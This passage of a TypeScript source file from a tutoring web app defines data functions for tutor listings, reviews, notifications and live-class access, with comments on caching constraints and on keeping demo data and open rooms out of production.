   keeps its static preview; with a DB, an empty catalogue returns [] — we never
   pass demo tutors off as real ones. */
export async function getExploreTutors(filters?: { subject?: string; q?: string }): Promise<ExploreTutor[] | null> {
  /* null → the client renders its static demo preview (DEV ONLY). In production a
     missing DB must never surface fabricated tutors: return [] so /explore shows
     its honest empty state instead. */
  if (demoFallback) return demoEnabled ? null : [];

  /* PORTED to apps/api (GET /tutors/explore).

     callAnonymous, NOT call: this runs during SSR on a cached route. Touching
     cookies() or headers() here would throw inside unstable_cache and silently
     opt the route out of caching outside it. e2e/isr.spec.ts guards that. */
  const qs = new URLSearchParams();
  if (filters?.subject) qs.set("subject", filters.subject);
  if (filters?.q) qs.set("q", filters.q);
  const suffix = qs.toString() ? `?${qs.toString()}` : "";
  return callAnonymous<ExploreTutor[]>(`/tutors/explore${suffix}`);
}

export async function createReview(input: { classId: string; rating: number; text?: string }): Promise<ActionResult> {
  if (demoFallback) return { ok: true, demo: true };
  /* PORTED to apps/api (POST /reviews). The booking check, the "class must have
     started" rule and the insert+recompute transaction all moved together — the
     last caller of the web-side recomputeTutorStats, so that duplicate is gone. */
  return call<ActionResult>("/reviews", input);
}

/** Reviews for a public storefront. Unknown slug → empty (never throws for a 404 page). */
export async function getTutorReviews(tutorSlug: string): Promise<TutorReviews> {
  const empty: TutorReviews = { items: [], average: 0, count: 0 };
  if (demoFallback) return empty;
  if (typeof tutorSlug !== "string" || !tutorSlug.trim()) return empty;

  /* PORTED to apps/api (GET /tutors/:slug/reviews).

     callAnonymous is MANDATORY here, not a preference: [slug]/page.tsx calls this
     from INSIDE unstable_cache, where Next 14 throws on cookies(). This is also
     the most-shared URL in the product, so a silent cache opt-out here is the
     single most expensive mistake available in Step 4. */
  return callAnonymous<TutorReviews>(`/tutors/${encodeURIComponent(tutorSlug.trim())}/reviews`);
}

export async function getNotifications(): Promise<NotificationItem[]> {
  if (demoFallback) return [];
  // PORTED to apps/api (GET /notifications).
  return call<NotificationItem[]>("/notifications", undefined, "GET");
}

/** Marks the caller's unread notifications as read (all of them, or just `ids`). */
export async function markNotificationsRead(input?: { ids?: string[] }): Promise<ActionResult> {
  if (demoFallback) return { ok: true, demo: true };
  // PORTED to apps/api (POST /notifications/read). Ownership is enforced by the
  // query scope there; ids only ever narrow it.
  return call<ActionResult>("/notifications/read", input ?? {});
}

/* ---------- Live room access ----------
   The live page must not be open to anyone holding the URL: you can join only if
   you booked the class (active booking) or you're the tutor who owns it. */
export async function canJoinClass(classId: string): Promise<{
  canJoin: boolean; role?: "tutor" | "student"; meetUrl?: string; reason?: string;
}> {
  /* Dev demo mode opens the room so the flow is walkable without a DB. In
     PRODUCTION a missing backend must NEVER open a live room to anyone holding the
     URL — demoFallback is false there, so this falls through to the API. */
  if (demoFallback) {
    return demoEnabled
      ? { canJoin: true, role: "student", meetUrl: liveRoomUrl(classId) }
      : { canJoin: false, reason: "not-found" };
  }
  // PORTED to apps/api (GET /classes/:id/join).
  return call(`/classes/${encodeURIComponent(classId)}/join`, undefined, "GET");
}

